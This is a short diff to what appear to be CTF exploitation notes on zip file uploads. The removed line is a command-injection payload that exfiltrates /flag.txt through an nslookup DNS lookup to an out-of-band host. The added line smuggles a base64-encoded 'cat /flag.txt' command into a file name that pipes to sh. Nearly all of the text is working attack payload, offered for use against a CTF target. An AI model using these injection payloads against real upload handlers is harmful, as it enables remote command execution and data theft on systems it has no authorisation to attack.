@@ -54,5 +54,9 @@ https://ey8u7q46.eu1.ctfio.com/stock-check.php?id=f3d1426d-16af-4243-a148-d7c874
 # Zip File Uploads
 
 ```
-$(nslookup `cat${IFS}/flag.txt`.puuatcmlkisigmqtcmzz2h8t9h4o08jgb.oast.fun)
+$(echo "Y2F0IC9mbGFnLnR4dA==" | base64 -d | sh > test.txt).pdf
 ```
+
+Compress to zip
+
+
